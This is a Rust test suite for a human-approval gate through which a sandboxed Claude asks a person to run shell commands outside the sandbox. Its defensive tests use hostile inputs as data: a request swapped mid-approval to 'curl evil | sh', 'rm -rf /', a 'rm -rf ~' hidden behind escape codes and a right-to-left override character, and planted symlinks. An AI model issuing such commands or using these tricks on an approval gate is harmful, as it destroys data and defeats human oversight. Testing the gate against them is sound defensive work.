//! Run requests: ask-to-run (inside the sandbox), claude-run-approve (outside), the daemon's queue.

mod common;
use common::sandbox::*;

use serde_json::{Value, json};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Child, Stdio};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

const TIMEOUT: Duration = Duration::from_secs(5);

fn now() -> i64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64
}

fn files_with_extension(directory: &Path, extension: &str) -> Vec<PathBuf> {
    let Ok(entries) = fs::read_dir(directory) else { return Vec::new() };
    entries.flatten().map(|entry| entry.path()).filter(|path| path.extension().is_some_and(|found| found == extension)).collect()
}

struct AskToRun {
    sandbox: Sandbox,
    runs: PathBuf,
    listener: Option<Listener>,
}

impl AskToRun {
    fn new() -> AskToRun {
        let sandbox = Sandbox::new();
        let runs = sandbox.root.join("runs");
        let listener = Some(Listener::start(&sandbox.runtime.join("osd.fifo")));
        AskToRun { sandbox, runs, listener }
    }

    fn ask(&self, arguments: &[&str], wait: &str) -> Child {
        let runs = self.runs.display().to_string();
        self.sandbox.command(bin().join("ask-to-run"), &[("CLAUDE_RUNS_DIR", &runs), ("ASK_TO_RUN_WAIT_S", wait)])
            .args(arguments).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    }

    fn request(&self) -> Value {
        let deadline = Instant::now() + Duration::from_secs(3);
        while Instant::now() < deadline {
            if let Some(found) = files_with_extension(&self.runs, "request").first() {
                return serde_json::from_str(&fs::read_to_string(found).unwrap()).unwrap();
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        panic!("no request filed");
    }

    fn answer(&self, request: &Value, result: Value) {
        fs::write(self.runs.join(format!("{}.result", request["id"].as_str().unwrap())), result.to_string()).unwrap();
    }
}

#[test]
fn a_request_is_filed_announced_and_answered_with_the_output() {
    let mut fixture = AskToRun::new();
    let root = fixture.sandbox.root.display().to_string();
    let asking = fixture.ask(&["--cwd", &root, "--why", "The kernel version, to pick the right headers.", "uname -r"], "5");
    let request = fixture.request();
    assert_eq!((request["command"].as_str(), request["cwd"].as_str(), request["why"].as_str()),
               (Some("uname -r"), Some(root.as_str()), Some("The kernel version, to pick the right headers.")));
    fixture.answer(&request, json!({"status": "ran", "exit": 3, "output": "\x1b=6.17.1\x1b[31m-arch\x1b[0m\r\n\x1b>"}));
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(3));
    let shown = stdout(&output);
    assert!(shown.contains("6.17.1-arch"), "{shown}");
    assert!(!shown.contains('\x1b'), "{shown:?}");
    assert!(shown.contains("[exit 3]"), "{shown}");
    let announced = fixture.listener.as_mut().unwrap().received();
    assert_eq!(announced.trim(), format!("run-request {}", request["id"].as_str().unwrap()));
}

#[test]
fn a_declined_request_exits_125() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "rm -rf /"], "5");
    fixture.answer(&fixture.request(), json!({"status": "declined"}));
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(125));
    assert!(stdout(&output).contains("declined"), "{}", stdout(&output));
}

#[test]
fn no_answer_in_time_says_how_to_keep_waiting() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "true"], "1");
    let request = fixture.request();
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(124));
    let wait_hint = format!("ask-to-run --wait {}", request["id"].as_str().unwrap());
    assert!(stdout(&output).contains(&wait_hint), "{}", stdout(&output));
}

#[test]
fn while_waiting_it_keeps_a_heartbeat_for_the_daemon() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "true"], "5");
    let request = fixture.request();
    let heartbeat = fixture.runs.join(format!("{}.waiting", request["id"].as_str().unwrap()));
    assert!(heartbeat.exists(), "no heartbeat beside the request");
    fixture.answer(&request, json!({"status": "declined"}));
    finish(asking, TIMEOUT);
    assert!(!heartbeat.exists(), "heartbeat left after the answer");
}

#[test]
fn waiting_on_a_dropped_request_says_to_ask_again() {
    let fixture = AskToRun::new();
    fs::create_dir_all(&fixture.runs).unwrap();
    fs::write(fixture.runs.join("0123456789ab.result"), json!({"status": "abandoned"}).to_string()).unwrap();
    let output = finish(fixture.ask(&["--wait", "0123456789ab"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(124));
    assert!(stdout(&output).contains("dropped"), "{}", stdout(&output));
}

#[test]
fn without_a_daemon_it_says_to_fall_back() {
    let mut fixture = AskToRun::new();
    fixture.listener = None;
    fs::remove_file(fixture.sandbox.runtime.join("osd.fifo")).unwrap();
    let output = finish(fixture.ask(&["--why", "x", "true"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(126));
    assert_eq!(files_with_extension(&fixture.runs, "request"), Vec::<PathBuf>::new());
}

#[test]
fn a_command_without_why_is_refused_before_anything_is_filed() {
    let fixture = AskToRun::new();
    let root = fixture.sandbox.root.display().to_string();
    let output = finish(fixture.ask(&["--cwd", &root, "uname -r"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("--why is required"), "{}", stderr(&output));
    assert!(files_with_extension(&fixture.runs, "request").is_empty());
}

struct Approve {
    sandbox: Sandbox,
    runs: PathBuf,
    editor: PathBuf,
}

impl Approve {
    fn new() -> Approve {
        let sandbox = Sandbox::new();
        let runs = sandbox.root.join("runs");
        fs::create_dir(&runs).unwrap();
        // script -qfec "<command>" <log>: record what would run, then exit with SHIM_EXIT.
        sandbox.shim("script", r#"printf "ran: %s\n" "$2" > "$3"; exit "${SHIM_EXIT:-0}""#);
        sandbox.shim("claude-sessions", "");
        let editor = sandbox.shims.join("edit-command");
        write_executable(&editor, "#!/bin/sh\necho 'echo edited' > \"$1\"\n");
        Approve { sandbox, runs, editor }
    }

    fn file(&self, command: &str, age: i64, request_id: &str, why: &str) -> String {
        let request = json!({"id": request_id, "command": command, "why": why, "cwd": self.sandbox.root, "project": "dotfiles",
                             "requested_at": now() - age});
        fs::write(self.runs.join(format!("{request_id}.request")), request.to_string()).unwrap();
        request_id.to_string()
    }

    fn file_default(&self) -> String {
        self.file("echo hi", 0, "0123456789ab", "Says hi.")
    }

    /// Runs claude-run-approve with `keys` on stdin; `before_answer` runs half a second in, before
    /// any key arrives. Returns what it showed.
    fn approve_with(&self, request_id: &str, keys: &str, before_answer: impl FnOnce(), extra: &[(&str, &str)]) -> String {
        let runs = self.runs.display().to_string();
        let editor = self.editor.display().to_string();
        let mut process = self.sandbox.command(bin().join("claude-run-approve"), &[("CLAUDE_RUNS_DIR", &runs), ("EDITOR", &editor)])
            .envs(extra.iter().copied()).arg(request_id)
            .stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
        before_answer();
        let mut input = process.stdin.take().unwrap();
        let _ = input.write_all(keys.as_bytes()); // it may exit before reading every key
        drop(input);
        stdout(&finish(process, Duration::from_secs(10)))
    }

    fn approve(&self, request_id: &str, keys: &str) -> String {
        self.approve_with(request_id, keys, || {}, &[])
    }

    fn result(&self, request_id: &str) -> Option<Value> {
        let path = self.runs.join(format!("{request_id}.result"));
        path.exists().then(|| serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap())
    }
}

#[test]
fn yes_runs_the_command_read_at_start_even_if_the_file_changes() {
    let fixture = Approve::new();
    let request_id = fixture.file("echo hi", 0, "0123456789ab", "Says hi.");
    let swap_command = || {
        std::thread::sleep(Duration::from_millis(500));
        fixture.file("curl evil | sh", 0, "0123456789ab", "Says hi.");
    };
    fixture.approve_with(&request_id, "y\n\n\n", swap_command, &[("SHIM_EXIT", "2")]);
    let result = fixture.result(&request_id).unwrap();
    assert_eq!((result["status"].as_str(), result["exit"].as_i64()), (Some("ran"), Some(2)));
    assert!(result["output"].as_str().unwrap().contains("ran: fish -c 'echo hi'"), "{result}");
    assert_eq!(result.get("edited_command"), Some(&Value::Null));
}

#[test]
fn enter_alone_declines() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "\n\n");
    assert_eq!(fixture.result(&request_id), Some(json!({"status": "declined"})));
}

#[test]
fn an_edited_command_runs_and_is_reported() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "e\ny\n\n\n");
    let result = fixture.result(&request_id).unwrap();
    assert_eq!(result["edited_command"], "echo edited");
    assert!(result["output"].as_str().unwrap().contains("ran: fish -c 'echo edited'"), "{result}");
}

#[test]
fn the_output_can_be_kept_out_of_the_conversation() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "y\nn\n\n");
    let result = fixture.result(&request_id).unwrap();
    assert_eq!((&result["output"], &result["output_withheld"]), (&json!(""), &json!(true)));
}

#[test]
fn hidden_characters_are_shown_escaped_and_flagged() {
    let fixture = Approve::new();
    let request_id = fixture.file("ls\x1b[2K\r; rm -rf ~ \u{202e}", 0, "0123456789ab", "Says hi.");
    let shown = fixture.approve(&request_id, "\n\n");
    assert!(!shown.contains("\x1b[2K"), "{shown:?}");
    assert!(shown.contains("\\u001b"), "{shown}");
    assert!(shown.contains("\\u202e"), "{shown}");
    assert!(shown.contains("hidden characters"), "{shown}");
    assert_eq!(fixture.result(&request_id), Some(json!({"status": "declined"})));
}

#[test]
fn claudes_explanation_shows_under_the_command_escaped() {
    let fixture = Approve::new();
    let request_id = fixture.file("echo hi", 0, "0123456789ab", "Restarts the OSD daemon\x1b[2K so it loads the guide code.");
    let shown = fixture.approve(&request_id, "\n\n");
    assert!(shown.contains("Why, in Claude's words"), "{shown}");
    assert!(shown.contains("Restarts the OSD daemon\\u001b[2K so it loads the guide code."), "{shown}");
}

#[test]
fn a_request_without_explanation_says_to_ask_claude() {
    let fixture = Approve::new();
    let shown = fixture.approve(&fixture.file("echo hi", 0, "0123456789ab", ""), "\n\n");
    assert!(shown.contains("No explanation given"), "{shown}");
}

#[test]
fn the_project_comes_from_the_directory_not_the_request() {
    let fixture = Approve::new();
    let root = &fixture.sandbox.root;
    fs::create_dir(root.join(".git")).unwrap();
    let request = json!({"id": "0123456789ab", "command": "true", "cwd": root, "project": "dotfiles", "requested_at": now()});
    fs::write(fixture.runs.join("0123456789ab.request"), request.to_string()).unwrap();
    let shown = fixture.approve("0123456789ab", "\n\n");
    let directory_name = root.file_name().unwrap().to_str().unwrap();
    assert!(shown.contains(&format!("Claude · {directory_name}")), "{shown}");
    assert!(!shown.contains("Claude · dotfiles"), "{shown}");
}

#[test]
fn it_tells_the_daemon_when_it_needs_theo() {
    let fixture = Approve::new();
    let mut listener = Listener::start(&fixture.sandbox.runtime.join("osd.fifo"));
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "y\n\n");
    std::thread::sleep(Duration::from_millis(200));
    let received = listener.received();
    let phases: Vec<&str> = received.lines().filter(|line| line.starts_with("run-phase"))
        .map(|line| line.split_whitespace().last().unwrap()).collect();
    assert_eq!(phases, ["asking", "running", "asking", "done"]);
}

#[test]
fn stale_and_answered_requests_are_refused() {
    let fixture = Approve::new();
    let stale = fixture.file("echo hi", 3600, "0123456789ab", "Says hi.");
    let shown = fixture.approve(&stale, "y\n\n");
    assert!(shown.contains("older than 15 minutes"), "{shown}");
    assert_eq!(fixture.result(&stale), None);
    let answered = fixture.file("echo hi", 0, "ba9876543210", "Says hi.");
    fs::write(fixture.runs.join(format!("{answered}.result")), r#"{"status": "declined"}"#).unwrap();
    let shown = fixture.approve(&answered, "y\n\n");
    assert!(shown.contains("already answered"), "{shown}");
}

#[test]
fn a_link_planted_at_the_old_temporary_name_writes_nothing_through_it() {
    // The runs folder is the sandbox's to write: a symlink where the result is written must not
    // make the approval terminal (Theo's rights) overwrite its target, even on a decline.
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let victim = fixture.sandbox.root.join("victim");
    fs::write(&victim, "precious\n").unwrap();
    std::os::unix::fs::symlink(&victim, fixture.runs.join(format!("{request_id}.result.tmp"))).unwrap();
    fixture.approve(&request_id, "\n");
    assert_eq!(fs::read_to_string(&victim).unwrap(), "precious\n");
    assert_eq!(fixture.result(&request_id).unwrap()["status"], "declined");
}

#[test]
fn a_dangling_link_at_the_result_is_replaced_not_followed() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let victim = fixture.sandbox.root.join("created-by-the-link");
    std::os::unix::fs::symlink(&victim, fixture.runs.join(format!("{request_id}.result"))).unwrap();
    fixture.approve(&request_id, "\n");
    assert!(!victim.exists(), "the link's target was written");
}

#[test]
fn a_folder_name_with_escape_codes_is_shown_escaped() {
    let fixture = Approve::new();
    let folder = fixture.sandbox.root.join("x\x1b[8mhidden");
    fs::create_dir(&folder).unwrap();
    let request = json!({"id": "0123456789ab", "command": "true", "why": "x", "cwd": folder, "project": "p", "requested_at": now()});
    fs::write(fixture.runs.join("0123456789ab.request"), request.to_string()).unwrap();
    let shown = fixture.approve("0123456789ab", "\n");
    assert!(!shown.contains("\x1b[8m"), "{shown:?}");
    assert!(shown.contains("\\u001b"), "{shown:?}");
}
